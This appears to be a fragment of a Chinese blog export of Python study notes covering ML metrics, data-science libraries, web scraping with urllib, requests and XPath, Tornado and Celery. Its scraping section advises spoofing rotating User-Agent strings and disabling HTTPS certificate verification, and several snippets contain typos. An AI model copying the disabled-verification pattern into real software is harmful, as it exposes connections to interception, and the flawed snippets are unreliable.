<li>R2_SCORE 决定系数：SSR &#x2F; SST，预测值的离散程度与真实值的离散程度</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(&#x27;MSE: &#x27;, mean_squared_error(y_test, y_pred))</span><br></pre></td></tr></table></figure>

<p>非监督模型</p>
<ul>
<li>聚类<ul>
<li>RMS</li>
<li>轮廓系数：<ul>
<li>簇内平均距离（内聚度），簇间平均距离（分离度）</li>
<li>要求数据是服从正态分布</li>
</ul>
</li>
<li>根据业务制定指标</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.metrics import silhouette_score</span><br><span class="line">print(silhouette_score(X, clt_res.labels_))</span><br></pre></td></tr></table></figure>

<p>关联模型</p>
<ul>
<li>支持度</li>
<li>置信度</li>
<li>提升度</li>
</ul>
<h1 id="常用库"><a href="#常用库" class="headerlink" title="常用库"></a>常用库</h1><h2 id="数据收集"><a href="#数据收集" class="headerlink" title="数据收集"></a>数据收集</h2><p><a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/">Beautiful Soup</a>是一个HTML和XML解析器，可为被解析的页面创建解析树，从而用于从web页面中提取数据。从网页中提取数据的过程称为网页抓取。</p>
<p>安装方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install beautifulsoup4</span><br></pre></td></tr></table></figure>

<p><a href="https://www.analyticsvidhya.com/blog/2015/10/beginner-guide-web-scraping-beautiful-soup-python/">操作指南</a></p>
<p><a href="https://www.analyticsvidhya.com/blog/2015/10/beginner-guide-web-scraping-beautiful-soup-python/">Scrapy</a>是一个用于大规模网页抓取的框架。</p>
<p>安装方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install scrapy</span><br></pre></td></tr></table></figure>

<p><a href="https://www.analyticsvidhya.com/blog/2017/07/web-scraping-in-python-using-scrapy/">操作方法</a></p>
<p><a href="https://www.seleniumhq.org/">Selenium</a>是一个倍受欢迎的自动化浏览器工具。在业界常用于测试，但对于网页抓取也非常方便。</p>
<p><a href="https://www.analyticsvidhya.com/blog/2019/05/scraping-classifying-youtube-video-data-python-selenium/">操作方法</a></p>
<h2 id="数据清零与操作"><a href="#数据清零与操作" class="headerlink" title="数据清零与操作"></a>数据清零与操作</h2><p><a href="https://pandas.pydata.org/pandas-docs/stable/">Pandas</a>是用Python语言编写的，主要用于数据操作和数据分析。</p>
<p>安装方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pandas</span><br></pre></td></tr></table></figure>

<p><a href="https://www.analyticsvidhya.com/blog/2016/01/12-pandas-techniques-python-data-manipulation/">操作方法1</a></p>
<p><a href="https://www.analyticsvidhya.com/blog/2015/07/11-steps-perform-data-analysis-pandas-python/">操作方法2</a></p>
<p><a href="https://pyod.readthedocs.io/en/latest/">PyOD</a>用于处理异常值。</p>
<p>安装方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pyod</span><br></pre></td></tr></table></figure>

<p><a href="https://www.analyticsvidhya.com/blog/2019/02/outlier-detection-python-pyod/">操作方法</a></p>
<p><a href="https://www.numpy.org/">NumPy</a>可进行高速多维数组运算。</p>
<p>安装方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install numpy</span><br></pre></td></tr></table></figure>

<p><a href="https://spacy.io/">Spacy</a>是一个非常有用且灵活的自然语言处理( NLP )库和框架，用于清理创建模型的文本文档。与类似用途的其他库相比，SpaCy速度更快。</p>
<p>安装方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install -U spacy</span><br><span class="line">python -m spacy download en</span><br></pre></td></tr></table></figure>

<p><a href="https://www.analyticsvidhya.com/blog/2017/04/natural-language-processing-made-easy-using-spacy-in-python/">操作方法</a></p>
<h2 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a>数据可视化</h2><p><a href="https://matplotlib.org/">Matplotlib</a>是Python中最流行的数据可视化库。</p>
<p>安装方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install matplotlib</span><br></pre></td></tr></table></figure>

<p><a href="https://www.analyticsvidhya.com/blog/2015/04/comprehensive-guide-data-exploration-sas-using-python-numpy-scipy-matplotlib-pandas/">操作方法</a></p>
<p><a href="https://seaborn.pydata.org/">Seaborn</a>是另一个基于matplotlib的绘图库。它是一个为绘制有吸引力的图像而提供高级接口的python库。matplotlib能实现功能，Seaborn只是以另一种更吸引人的视觉方式来实现。</p>
<p>安装方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install seaborn</span><br></pre></td></tr></table></figure>

<p><a href="https://bokeh.pydata.org/en/latest/">Bokeh</a>是一个面向现代网页浏览器的交互式可视化库，为大量数据集提供优美的通用图形结构。</p>
<p>安装方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install bokeh</span><br></pre></td></tr></table></figure>

<p><a href="https://www.analyticsvidhya.com/blog/2015/08/interactive-data-visualization-library-python-bokeh/">操作方法</a></p>
<h2 id="建模"><a href="#建模" class="headerlink" title="建模"></a>建模</h2><p><a href="https://scikit-learn.org/stable/">Scikit-learn</a>是Python构建模型中的佼佼者。支持在机器学习中执行的不同操作，如分类、回归、聚类和模型选择等。</p>
<p><a href="https://www.analyticsvidhya.com/blog/2015/01/scikit-learn-python-machine-learning-tool/">操作方法</a></p>
<p><a href="https://www.tensorflow.org/">TensorFlow</a>由谷歌开发，是一个流行的深度学习库，可帮助构建、培训不同模型。是一个开放源码的端到端平台。TensorFlow提供简单的模型构建，强大的机器学习生产，以及强大的实验工具和库。</p>
<p><a href="https://www.tensorflow.org/install">安装方法</a></p>
<p><a href="https://www.analyticsvidhya.com/blog/2017/03/tensorflow-understanding-tensors-and-graphs/">操作方法1</a> <a href="https://www.analyticsvidhya.com/blog/2017/06/getting-started-with-deep-learning-using-keras-in-r/">操作方法2</a></p>
<p><a href="https://pytorch.org/">PyTorch</a>是一个基于Python的科学计算包，是NumPy的替代品，可使用GPU的强大功能。</p>
<p>· 深度学习研究型平台，拥有最大灵活性和最快速度</p>
<p><a href="https://pytorch.org/get-started/locally/">安装方法</a></p>
<p><a href="https://www.analyticsvidhya.com/blog/2018/02/pytorch-tutorial/">操作方法1</a> <a href="https://www.analyticsvidhya.com/blog/2019/01/guide-pytorch-neural-networks-case-studies/">操作方法2</a></p>
<h2 id="模型解释"><a href="#模型解释" class="headerlink" title="模型解释"></a>模型解释</h2><p><a href="https://github.com/marcotcr/lime">Lime</a>是一种算法（库），可以解释任何分类器或回归量的预测。</p>
<p>安装方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install lime</span><br></pre></td></tr></table></figure>

<p><a href="https://www.analyticsvidhya.com/blog/2017/06/building-trust-in-machine-learning-models/">操作方法</a></p>
<p><a href="https://github.com/h2oai/mli-resources">H2O</a>自动化机器学习的市场领导者。提供简单的数据可视化技术，用于表示高度特征交互和非线性模型行为，通过可视化提供机器学习可解释性（MLI），说明建模结果和模型中特征的影响。</p>
<p><a href="https://www.h2o.ai/wp-content/uploads/2018/01/Machine-Learning-Interpretability-MLI_datasheet_v4-1.pdf">操作方法</a></p>
<h2 id="语音处理"><a href="#语音处理" class="headerlink" title="语音处理"></a>语音处理</h2><p><a href="https://librosa.github.io/librosa/">Librosa</a>是一个用于音乐和音频分析的Python库。它提供了创建音乐信息检索系统所需的构建块。</p>
<p><a href="https://librosa.github.io/librosa/install.html">安装方法</a></p>
<p><a href="https://www.analyticsvidhya.com/blog/2017/08/audio-voice-processing-deep-learning/">操作方法</a></p>
<p><a href="https://github.com/CPJKU/madmom">Madmom</a>是一个用于音频数据分析的很棒的Python库。它是一个用Python编写的音频信号处理库，主要用于音乐信息检索（MIR）任务。</p>
<p>安装方法：依赖Numpy，Scipy，Cython，Mido</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install madmom</span><br></pre></td></tr></table></figure>

<p>测试依赖：PyTest，Fuaudio，PuFftw</p>
<p><a href="https://www.analyticsvidhya.com/blog/2018/02/audio-beat-tracking-for-music-information-retrieval/">操作方法</a></p>
<p><a href="https://github.com/tyiannak/pyAudioAnalysis">pyAudioAnalysis</a>是一个用于音频特征提取、分类和分段的Python库，涵盖广泛的音频分析任务，例如：</p>
<ul>
<li>对未知声音进行分类</li>
<li>检测音频故障并排除长时间录音中的静音时段</li>
<li>进行监督和非监督的分割</li>
<li>提取音频缩略图等等</li>
</ul>
<p>安装方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pyAudioAnalysis</span><br></pre></td></tr></table></figure>

<h2 id="图像处理"><a href="#图像处理" class="headerlink" title="图像处理"></a>图像处理</h2><p><a href="https://opencv-python-tutroals.readthedocs.io/en/latest/py_tutorials/py_setup/py_intro/py_intro.html">OpenCV-Python</a>是用于图像处理的Python API，结合了OpenCV C ++ API和Python语言的最佳特性。主要用于解决计算机视觉问题。</p>
<p>安装方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install opencv-python</span><br></pre></td></tr></table></figure>

<p><a href="https://www.analyticsvidhya.com/blog/2018/12/introduction-face-detection-video-deep-learning-python/">操作方法1</a> <a href="https://www.analyticsvidhya.com/blog/2019/03/opencv-functions-computer-vision-python/">操作方法2</a></p>
<p><a href="https://scikit-image.org/">Scikit-image</a>是另一个用于图像处理的python库，是用于执行多个不同图像处理任务的算法集合。可用于图像分割、几何变换、色彩空间操作、分析、过滤，形态学、特征检测等等。</p>
<p>安装方法：依赖Numpy，Scipy，Joblib</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install -U scikit-learn</span><br></pre></td></tr></table></figure>

<p><a href="https://pillow.readthedocs.io/en/stable/">Pillow</a>是从PIL（Python Imaging Library）派生出来的，在一些Linux发行版（如Ubuntu）中被用作原始PIL的替代。</p>
<p>安装方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install Pillow</span><br></pre></td></tr></table></figure>

<p><a href="https://www.analyticsvidhya.com/blog/2019/06/ai-comic-zain-issue-2-facial-recognition-computer-vision/">操作方法</a></p>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p><a href="http://initd.org/psycopg/">Psycopg</a>是Python编程语言中最流行的PostgreSQL（高级开源代码关系数据库）适配器。</p>
<p>安装方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install psycopg2</span><br></pre></td></tr></table></figure>

<p><a href="https://www.sqlalchemy.org/">SQLAlchemy</a>是最流行的数据库语言。SQLAlchemy是pythonSQL工具包和对象关系映射器，它为应用程序开发人员提供了SQL的全部功能，且极具灵活性。</p>
<p>安装方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install SQLAlchemy</span><br></pre></td></tr></table></figure>

<h2 id="模型部署"><a href="#模型部署" class="headerlink" title="模型部署"></a>模型部署</h2><p><a href="http://flask.pocoo.org/docs/1.0/">Flask</a>是一个用Python编写的Web框架，广泛用于部署数据科学模型。</p>
<p><a href="https://www.analyticsvidhya.com/blog/2017/09/machine-learning-models-as-apis-using-flask/">操作方法</a></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>下面的网站包含了字符编码，文件处理，图像处理，游戏与多媒体，大数据与科学计算，人工智能与机器学习，系统与命令行，数据库，Web框架，安全，GUI库等相关内容。</p>
<p><a href="https://zhuanlan.zhihu.com/p/98366871">其他库参考</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Web</title>
    <url>/2020/02/09/Python/PythonWeb/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><h2 id="Robots-协议"><a href="#Robots-协议" class="headerlink" title="Robots 协议"></a>Robots 协议</h2><p>Robots 协议指定了一个网站可以爬取的信息，例如： <code>http://www.taobao.com/robots.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent:  Baiduspider</span><br><span class="line">Allow:  /article</span><br><span class="line">Allow:  /oshtml</span><br><span class="line">Allow:  /ershou</span><br><span class="line">Allow: /$</span><br><span class="line">Disallow:  /product/</span><br><span class="line">Disallow:  /</span><br><span class="line"></span><br><span class="line">User-Agent:  *</span><br><span class="line">Disallow:  /</span><br><span class="line"></span><br><span class="line"># 站点信息</span><br><span class="line">Sitemap: ...</span><br></pre></td></tr></table></figure>

<p>使用爬虫技术，需要注意应：</p>
<ul>
<li>要伪装User-Agent，且需要多个，随机选取</li>
<li>对参数进行URL编码</li>
<li>注意是否是通过AJAX传输数据</li>
<li>保存服务器下发的Cookies</li>
</ul>
<h2 id="URL-Lib-包"><a href="#URL-Lib-包" class="headerlink" title="URL Lib 包"></a>URL Lib 包</h2><p><code>urllib.request</code>，负责读写 url。 <code>urllib.error</code>，定义错误与异常。 <code>urllib.parse</code>，url参数的编码解码。 <code>urllib.robotparser</code>，用于分析robots.txt文件。</p>
<p>简单的读写URL：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from urllib.request import urlopen, Request</span><br><span class="line"></span><br><span class="line"># 直接打开一个url，Request对象，返回HTTPResponse对象，用法类似文件</span><br><span class="line">res = urlopen(url, data)</span><br><span class="line"></span><br><span class="line"># 构造Request</span><br><span class="line">req = Request(url, headers=&#123;</span><br><span class="line">    &#x27;User-agent&#x27;: &#x27;user agent&#x27;</span><br><span class="line">&#125;)</span><br><span class="line"># 或 req.add_header(&#x27;&#x27;, &#x27;&#x27;)</span><br><span class="line">res = urlopen(req)</span><br><span class="line"></span><br><span class="line"># 查看结果</span><br><span class="line">res.closed  # 查看是否关闭，False</span><br><span class="line">with res:</span><br><span class="line">    res.status   # 状态码</span><br><span class="line">    res.reason   # 状态</span><br><span class="line">    res.getrul() # 真正的URL，例如重定向后的URL</span><br><span class="line">    res.info()   # headers</span><br><span class="line">    res.read()   # 返回读取的内容</span><br><span class="line">res.closed  # 查看是否关闭，True</span><br></pre></td></tr></table></figure>

<p>URL参数的编码解码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from urllib.request import parse</span><br><span class="line"></span><br><span class="line">d = &#123;</span><br><span class="line">    &#x27;id&#x27;: 1,</span><br><span class="line">    &#x27;name&#x27;: &#x27;auther&#x27;,</span><br><span class="line">&#125;</span><br><span class="line"># url编码</span><br><span class="line">arg = parse.urlencode(d)</span><br><span class="line"># url解码</span><br><span class="line">d = parse.unquote(arg)</span><br><span class="line"># 使用</span><br><span class="line">url = f&quot;http://...?&#123;arg&#125;&quot;   # GET</span><br><span class="line"># 或 urlopen(req, arg.encode())  POST</span><br></pre></td></tr></table></figure>

<p><a href="http://httpbin.org/">HTTP 实验网站</a></p>
<h2 id="AJAX-与-HTTPS"><a href="#AJAX-与-HTTPS" class="headerlink" title="AJAX 与 HTTPS"></a>AJAX 与 HTTPS</h2><p>在Chrome浏览器里，进入开发者选项，选择XHR分类，查看异步请求。利用其中的AJAX接口进行数据请求。</p>
<p>HTTPS是由权威机构颁发的证书，颁发的证书文件需要事先上传至被认证的服务器上。当用户访问网站时，用户浏览器会首先得到该网站的服务器证书，用户拿到证书后进行验证，进而判断通信是否安全。</p>
<p>在爬虫中，我们会遇到拥有HTTPS但是不信任的网站，因此要尽量忽略HTTPS以减少工作量。</p>
<p>使用SSL模块忽略HTTPS：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import ssl</span><br><span class="line"></span><br><span class="line"># 忽略不信任的证书</span><br><span class="line">context = ssl._create_unverified_context()</span><br><span class="line">with urlopen(req, context = context) as res:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<h2 id="urllib-3"><a href="#urllib-3" class="headerlink" title="urllib 3"></a>urllib 3</h2><p>urllib 3库是一个第三方库，提供了例如连接池管理等功能。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install urllib3</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import urllib3</span><br><span class="line"></span><br><span class="line"># 打开一个 URL 池管理器</span><br><span class="line">with urllib3.PoolManager() as http:</span><br><span class="line">    # http.urlopen()</span><br><span class="line">    resp = http.request()</span><br><span class="line">    # resp.status</span><br><span class="line">    # resp.reason</span><br><span class="line">    # resp.headers</span><br><span class="line">    # resp.data </span><br></pre></td></tr></table></figure>

<h2 id="requests-库"><a href="#requests-库" class="headerlink" title="requests 库"></a>requests 库</h2><p>requests库是基于urllib3库的，而且提供了更加友好的API使用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">resp = requests.request(&#x27;GET&#x27;, url, headers=&#123;</span><br><span class="line">        &#x27;User-Agent&#x27;: ua</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">with resp:</span><br><span class="line">    # resp.url</span><br><span class="line">    # resp.status_code</span><br><span class="line">    # resp.request.headers</span><br><span class="line">    # resp.text</span><br><span class="line">    # resp.cookies</span><br></pre></td></tr></table></figure>

<p>使用带Cookie的访问：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with request.Session() as session:</span><br><span class="line">    for url in urls:</span><br><span class="line">        resp = session.get(url, headers=&#123;&#x27;&#x27;,&#x27;&#x27;&#125;)</span><br><span class="line">        with resp:</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>

<h2 id="XPATH-技术"><a href="#XPATH-技术" class="headerlink" title="XPATH 技术"></a>XPATH 技术</h2><p>XPath是用来在XML中查找信息的语言。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;bookstore&gt;</span><br><span class="line"></span><br><span class="line">&lt;book&gt;</span><br><span class="line">  &lt;title lang=&quot;en&quot;&gt;Harry Potter&lt;/title&gt;</span><br><span class="line">  &lt;author&gt;J K. Rowling&lt;/author&gt; </span><br><span class="line">  &lt;year&gt;2005&lt;/year&gt;</span><br><span class="line">  &lt;price&gt;29.99&lt;/price&gt;</span><br><span class="line">&lt;/book&gt;</span><br><span class="line"></span><br><span class="line">&lt;/bookstore&gt;</span><br></pre></td></tr></table></figure>

<p>在XPath中定义了节点：</p>
<ul>
<li>元素：<code>&lt;title lang=&quot;en&quot;&gt;Harry Potter&lt;/title&gt;</code></li>
<li>属性：<code>lang=&quot;en&quot;</code></li>
<li>文本：</li>
<li>命名空间：<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</code></li>
<li>处理指令</li>
<li>注释</li>
<li>文档节点：<code>&lt;bookstore&gt;</code></li>
</ul>
<p>也包含节点关系，如：父，子，兄弟，所有祖先，所有后代。</p>
<p>在XPath中，节点之间的父子关系可以用表达式表示：</p>
<ul>
<li><code>nodename</code>：选取此节点的所有子节点</li>
<li><code>/</code>：根节点或分隔符 </li>
<li><code>//</code>：后继节点，不考虑路径</li>
<li><code>.</code>：当前节点</li>
<li><code>..</code>：父节点</li>
<li><code>@</code>：属性</li>
<li><code>|</code>：选取多个路径</li>
</ul>
<p>谓语是用于按照索引选择子节点的工具：</p>
<ul>
<li><code>[1]</code>：第一个元素</li>
<li><code>[last()]</code>：最后一个元素</li>
<li><code>[position()&lt;3]</code>：前两个元素</li>
<li><code>[@lang]</code>：拥有lang属性的元素</li>
<li><code>[@lang=&#39;eng&#39;]</code>：满足条件的元素</li>
<li><code>[price&gt;10]</code>：元素值大于10的元素</li>
</ul>
<p>通配符：</p>
<ul>
<li><code>*</code>：任何元素节点</li>
<li><code>@*</code>：任何属性节点</li>
<li><code>node()</code>：任何类型节点</li>
</ul>
<p>轴可定义相对于当前节点的节点集：</p>
<ul>
<li>ancestor：选取当前节点的所有祖先（父、祖父等）。</li>
<li>ancestor-or-self：选取当前节点的所有祖先（父、祖父等）以及当前节点本身。</li>
<li>attribute：选取当前节点的所有属性。</li>
<li>child：选取当前节点的所有子元素。</li>
<li>descendant：选取当前节点的所有后代元素（子、孙等）。</li>
<li>descendant-or-self：选取当前节点的所有后代元素（子、孙等）以及当前节点本身。</li>
<li>following：选取文档中当前节点的结束标签之后的所有节点。</li>
<li>namespace：选取当前节点的所有命名空间节点。</li>
<li>parent：选取当前节点的父节点。</li>
<li>preceding：选取文档中当前节点的开始标签之前的所有节点。</li>
<li>preceding-sibling：选取当前节点之前的所有同级节点。</li>
<li>self：选取当前节点。</li>
</ul>
<p>使用轴可以选取某些节点：</p>
<ul>
<li>child::book：选取所有属于当前节点的子元素的 book 节点。</li>
<li>child::text()：选取当前节点的所有文本子节点。</li>
</ul>
<p>安装 lxml 模块：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># linux 需要依赖</span><br><span class="line">sudo apt-get install libxml2-dev libxslt-dev </span><br><span class="line"># windows 不需要</span><br><span class="line">pip install lxml</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line"></span><br><span class="line"># 构建标签</span><br><span class="line">root = etree.Element(&#x27;html&#x27;)</span><br><span class="line">body = etree.Element(&#x27;body&#x27;)</span><br><span class="line">root.append(body)</span><br><span class="line"></span><br><span class="line"># 打印HTML</span><br><span class="line">print(etree.tostring(root))</span><br><span class="line">print(etree.tostring(</span><br><span class="line">    root,</span><br><span class="line">    pretty_print=True</span><br><span class="line">).decode())</span><br><span class="line"></span><br><span class="line"># 添加子元素</span><br><span class="line">sub = etree.SubElement(body, &#x27;child1&#x27;)</span><br><span class="line">sub = etree.SubElement(body, &#x27;child2&#x27;)</span><br><span class="line"></span><br><span class="line"># 解析HTML</span><br><span class="line">etree.HTML(text)</span><br><span class="line">a_node.xpath(&#x27;xpath 路径&#x27;)</span><br></pre></td></tr></table></figure>

<p>在Chrome使用XPath工具：在选定的标签上右键-&gt;Copy-&gt;XPath，并根据给定的内容进行修改。也可以使用插件<code>ChroPath</code>调试。</p>
<p>在分析选定标签的时候，可以优先找id属性，其次class属性。</p>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;https://moive.douban.com&#x27;</span><br><span class="line">ua = &#x27;&#x27;</span><br><span class="line">with requests.get(</span><br><span class="line">    url,</span><br><span class="line">    headers=&#123;&#x27;User-Agent&#x27;: ua&#125;</span><br><span class="line">) as response:</span><br><span class="line">    # HTML 内容</span><br><span class="line">    content = response.txt</span><br><span class="line">    # 解析为 DOM</span><br><span class="line">    html = etree.HTML(content)</span><br><span class="line">    # 使用XPath得到内容</span><br><span class="line">    titles = html.xpath(&quot;//div[@class=&#x27;villboard-bd&#x27;]//tr/td/a/text()&quot;)</span><br><span class="line">    for item in titles:</span><br><span class="line">        print(item)</span><br></pre></td></tr></table></figure>

<p><a href="https://www.w3school.com.cn/xpath/index.asp">XPath 语言</a></p>
<h2 id="Spider"><a href="#Spider" class="headerlink" title="Spider"></a>Spider</h2><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h2><h2 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h2><h2 id="Cherrypy"><a href="#Cherrypy" class="headerlink" title="Cherrypy"></a>Cherrypy</h2><h2 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h2><p><a href="https://www.osgeo.cn/tornado/">官方文档</a> <a href="https://github.com/tornadoweb/tornado">Github</a></p>
<p>优势：</p>
<ul>
<li>适合构建微服务。</li>
</ul>
<p>用法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import tornado.ioloop</span><br><span class="line">import tornado.web</span><br><span class="line"></span><br><span class="line">class MainHandler(tornado.web.RequestHandler):</span><br><span class="line">    def get(self):</span><br><span class="line">        self.write(&quot;Hello, world&quot;)</span><br><span class="line"></span><br><span class="line">def make_app():</span><br><span class="line">    return tornado.web.Application([</span><br><span class="line">        (r&quot;/&quot;, MainHandler),</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app = make_app()</span><br><span class="line">    app.listen(8888)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure>

<h2 id="分布式系统-Celery"><a href="#分布式系统-Celery" class="headerlink" title="分布式系统 Celery"></a>分布式系统 Celery</h2><p>特点：</p>
<ul>
<li>分布式系统</li>
<li>异步任务队列</li>
<li>支持任务调度</li>
</ul>
<p>工作：</p>
<ul>
<li>执行异步任务</li>
<li>执行定时任务</li>
</ul>
<p>需要消息中间件：RabbitMQ 或 Redis</p>
<h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasks.py</span><br><span class="line">from celery import Celery</span><br><span class="line">app = Celery(&quot;task_name&quot;, backend=&quot;redis://local:6379/2&quot;, broker=&quot;redis://local:6379/1&quot;)</span><br><span class="line"></span><br><span class="line">@app.task  # 变为异步</span><br><span class="line">def add(x, y):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<p>启动 worker</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">celery worker -A tasks -l INFO</span><br></pre></td></tr></table></figure>

<p>使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from tasks import add</span><br><span class="line">x = add.delay(1,2)</span><br></pre></td></tr></table></figure>

<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>目录：</p>
<ul>
<li>celery_app<ul>
<li>celeryconfig.app</li>
<li>task1.py</li>
<li>task2.py</li>
</ul>
</li>
</ul>
<p>app.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app = Celery(&quot;task_name&quot;)</span><br><span class="line">app.config_from_object(&quot;celery_app.celeryconfig&quot;)</span><br></pre></td></tr></table></figure>

<p>celeryconfig.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BROKER_URL = &#x27;&#x27;</span><br><span class="line">CELERY_RESULT_BACKEND = &#x27;&#x27;  # 结果存储到数据库</span><br><span class="line">CELERY_TIMEZONE = &#x27;&#x27;</span><br><span class="line">CELERY_IMPORTS = (</span><br><span class="line">    &#x27;celery_app.task1&#x27;,</span><br><span class="line">    &#x27;celery_app.task2&#x27;,</span><br><span class="line">)</span><br><span class="line">CELERY_SCHEDULE = &#123;</span><br><span class="line">    &#x27;task1&#x27;: &#123;</span><br><span class="line">        &#x27;task&#x27;: &#x27;celery_app.task1.add&#x27;,</span><br><span class="line">        &#x27;schedule&#x27;: timedelta(seconds=10),</span><br><span class="line">        &#x27;args&#x27;: (2, 3),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="结合-Django"><a href="#结合-Django" class="headerlink" title="结合 Django"></a>结合 Django</h3><h3 id="监控-Flower"><a href="#监控-Flower" class="headerlink" title="监控 Flower"></a>监控 Flower</h3><h3 id="进程管理-Supervisor"><a href="#进程管理-Supervisor" class="headerlink" title="进程管理 Supervisor"></a>进程管理 Supervisor</h3><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p>配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def make_app():</span><br><span class="line">    return tornado.web.Application(</span><br><span class="line">        # 路由配置</span><br><span class="line">        [</span><br><span class="line">            (r&quot;/&quot;, MainHandler),</span><br><span class="line">        ],</span><br><span class="line">        # 渲染模板路径</span><br><span class="line">        template_path = os.path.join(</span><br><span class="line">            os.path.dirname(__file__), &quot;template&quot;</span><br><span class="line">        ),</span><br><span class="line">        # 开启 Debug</span><br><span class="line">        debug = True</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>控制器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class MainHandler(tornado.web.RequestHandler):</span><br><span class="line">    def get(self):</span><br><span class="line">        self.render(&quot;index.html&quot;, msg=&quot;&quot;)</span><br></pre></td></tr></table></figure>

<p>index.html</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;msg&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="异步服务器与客户端"><a href="#异步服务器与客户端" class="headerlink" title="异步服务器与客户端"></a>异步服务器与客户端</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app = tornado.web.Application()</span><br><span class="line">http_server = tornado.httpserver.HTTPServer(app)</span><br><span class="line">http_server.listen(8888)</span><br><span class="line">tornado.ioloop.IOLoop.instance().start()</span><br></pre></td></tr></table></figure>

<h2 id="接口测试"><a href="#接口测试" class="headerlink" title="接口测试"></a>接口测试</h2>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Github 博客搭建</title>
    <url>/2019/03/29/%E5%85%B6%E4%BB%96/GitBlog/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

